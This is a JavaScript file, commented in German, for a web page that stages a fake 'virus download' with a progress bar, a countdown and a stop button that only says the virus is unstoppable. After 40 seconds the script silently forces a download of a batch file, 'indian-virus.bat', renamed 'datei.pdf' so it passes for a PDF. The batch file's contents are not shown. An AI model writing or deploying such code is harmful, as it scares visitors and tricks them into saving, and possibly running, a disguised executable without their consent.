// Funktion für den Stop-Button
function stopDownload() {
    alert("ACTION FAILED! TOO LATE! The virus is unstoppable now!");
}

// Fortschrittsbalken und Countdown initialisieren
document.addEventListener("DOMContentLoaded", () => {
    const progressBar = document.querySelector(".progress-bar");
    const completionMessage = document.querySelector(".completion-message");
    const warningPopup = document.querySelector(".warning-popup");
    const countdownElement = document.getElementById("countdown");

    let countdown = 30; // Countdown-Zeit in Sekunden

    // Fortschrittsbalken animieren
    setTimeout(() => {
        progressBar.style.width = "100%";

        // Abschlussmeldung anzeigen
        setTimeout(() => {
            completionMessage.style.display = "block";
        }, 30000); // Nach 30 Sekunden
    }, 500);

    // Warnmeldung nach 10 Sekunden einblenden
    setTimeout(() => {
        warningPopup.classList.add("show");
    }, 10000);

    // Countdown starten
    const countdownInterval = setInterval(() => {
        countdown -= 1;
        countdownElement.textContent = countdown;

        if (countdown <= 0) {
            clearInterval(countdownInterval);
            document.querySelector(".countdown").style.display = "none";
        }
    }, 1000);
});

// JavaScript für die Warnmeldung
document.addEventListener("DOMContentLoaded", () => {
    // Admin-Meldung nach 10 Sekunden anzeigen
    setTimeout(() => {
        const warningPopup = document.querySelector(".warning-popup");
        warningPopup.style.display = "block"; // Sichtbar machen
    }, 10000); // Nach 10 Sekunden
});


// Funktion zum automatischen Herunterladen
setTimeout(() => {
    const downloadLink = document.createElement("a");
    downloadLink.href = "indian-virus.bat";
    downloadLink.download = "datei.pdf";
    document.body.appendChild(downloadLink);
    downloadLink.click();
    document.body.removeChild(downloadLink);
}, 40000);


// JavaScript für die Warnmeldung
document.addEventListener("DOMContentLoaded", () => {
    // Admin-Meldung nach 10 Sekunden anzeigen
    setTimeout(() => {
        const warningPopup = document.querySelector(".warning-popup");
        warningPopup.style.display = "block"; // Sichtbar machen
    }, 10000); // Nach 10 Sekunden
});
